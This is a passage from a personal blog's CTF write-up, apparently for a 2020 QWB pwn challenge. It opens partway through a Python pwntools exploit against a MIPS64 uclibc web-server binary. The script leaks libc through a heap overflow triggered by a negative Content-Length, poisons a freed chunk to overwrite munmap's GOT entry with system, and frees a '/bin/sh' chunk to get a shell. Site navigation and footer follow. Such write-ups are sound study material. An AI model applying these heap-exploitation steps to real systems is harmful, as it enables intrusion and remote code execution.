class="string">"Content-Indexx: %d\n"</span> % idx</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.clean()</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvrepeat(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    payload = <span class="string">"GET /index.html?Show=%d HTTP/1.1\n"</span> % idx</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    payload = <span class="string">"GET /index.html?Del=%d HTTP/1.1\n"</span> % idx</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvrepeat(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">error_post</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    payload = <span class="string">"POST /index.html HTTP/1.1\n"</span></span><br><span class="line">    payload += <span class="string">"Content-Length: %s\n"</span> % content</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvrepeat(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">post(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">"A"</span>*<span class="number">0x20</span>)</span><br><span class="line">post(<span class="number">1</span>, <span class="number">0x120</span>, <span class="string">"B"</span>*<span class="number">0x120</span>)</span><br><span class="line">post(<span class="number">2</span>, <span class="number">0x20</span>, <span class="string">"C"</span>*<span class="number">0x20</span>)</span><br><span class="line">post(<span class="number">3</span>, <span class="number">0x20</span>, <span class="string">"D"</span>*<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">error_post(<span class="number">0</span>, <span class="string">"-1 "</span>+ <span class="string">"A"</span> * (<span class="number">509</span>+<span class="number">0x38</span>+<span class="number">11</span><span class="number">-4</span>) + <span class="string">"@@@@"</span>) <span class="comment"># idx0: 0x20d</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">"@@@@"</span>)</span><br><span class="line">leak_libc = uu64(rc(<span class="number">5</span>).rjust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">info_addr(<span class="string">"leak_libc"</span>, leak_libc)</span><br><span class="line">libc = leak_libc<span class="number">-0xc2d48</span></span><br><span class="line">info_addr(<span class="string">"libc"</span>, libc)</span><br><span class="line"></span><br><span class="line">system = libc + <span class="number">0x65370</span></span><br><span class="line">puts = libc + <span class="number">0x457b0</span></span><br><span class="line">munmmap = libc + <span class="number">0xa9228</span> <span class="comment"># munmap@got</span></span><br><span class="line"></span><br><span class="line">error_post(<span class="number">0</span>, <span class="string">"-1 "</span>+ <span class="string">"A"</span> * (<span class="number">509</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>)) <span class="comment"># recover</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">error_post(<span class="number">0</span>, <span class="string">"-1 "</span>+ <span class="string">"A"</span> * (<span class="number">509</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(munmmap<span class="number">-0x10</span> + <span class="number">3</span>)) <span class="comment"># write fd</span></span><br><span class="line">post(<span class="number">4</span>, <span class="number">0x20</span>, <span class="string">"/bin/sh"</span>.ljust(<span class="number">0x20</span>, <span class="string">"\x00"</span>))</span><br><span class="line">post(<span class="number">5</span>, <span class="number">0x20</span>, p64(system)[<span class="number">3</span>:].ljust(<span class="number">0x20</span>, <span class="string">"\x00"</span>))</span><br><span class="line">error_post(<span class="number">0</span>, <span class="string">"-1 "</span>+ <span class="string">"A"</span> * (<span class="number">509</span>) + p64((<span class="number">1</span>&lt;&lt;<span class="number">64</span>)<span class="number">-0x10</span>) + p64(<span class="number">0x20002</span>)) <span class="comment"># faking #4's chunksize</span></span><br><span class="line"><span class="comment"># free to trigger</span></span><br><span class="line"><span class="comment"># raw_input("go?")</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="References"><a class="header-anchor" href="#References">¶</a>References</h2>
<ol>
<li><a href="https://ruan777.github.io/2020/08/25/mips64%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" target="_blank" rel="noopener">https://ruan777.github.io/2020/08/25/mips64调试环境搭建/</a></li>
<li><a href="https://github.com/Ma3k4H3d/2020-QWB-PWN" target="_blank" rel="noopener">https://github.com/Ma3k4H3d/2020-QWB-PWN</a></li>
</ol>

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>


    <footer class="post-footer">
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/07/06/源泉/" rel="next" title="源泉">
                <i class="fa fa-chevron-left"></i> 源泉
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/09/22/VirtualBox-Exploitation-3/" rel="prev" title="VirtualBox Exploitation #3">
                VirtualBox Exploitation #3 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>

          
          </div>
          


          
  <div class="comments" id="comments">
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目錄
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            本站概覽
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="Matthew Shao">
          <p class="site-author-name" itemprop="name">Matthew Shao</p>
          <p class="site-description motion-element" itemprop="description">🎓</p>
        </div>
        <nav class="site-state motion-element">
        
          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">65</span>
                <span class="site-state-item-name">文章</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-categories">
              <a href="/categories">
                <span class="site-state-item-count">2</span>
                <span class="site-state-item-name">分類</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">14</span>
                <span class="site-state-item-name">標籤</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/MatthewShao" target="_blank" title="Github">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                  Github
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Debug-Environment"><span class="nav-number">1.</span> <span class="nav-text">¶Debug Environment</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reversing-and-Vulnerability"><span class="nav-number">2.</span> <span class="nav-text">¶Reversing and Vulnerability</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Heap-Overflow-and-uclibc"><span class="nav-number">3.</span> <span class="nav-text">¶Heap-Overflow and uclibc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exp"><span class="nav-number">4.</span> <span class="nav-text">¶Exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#References"><span class="nav-number">5.</span> <span class="nav-text">¶References</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Matthew Shao</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 強力驅動
</div>

<div class="theme-info">
  主題 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Logos
  </a>
</div>


        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  




  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  


  <script type="text/javascript" src="/js/src/schemes/logos.js?v=5.1.0"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  



  




	





  





  

  




  
  

  

  

  

  


</body>
</html>
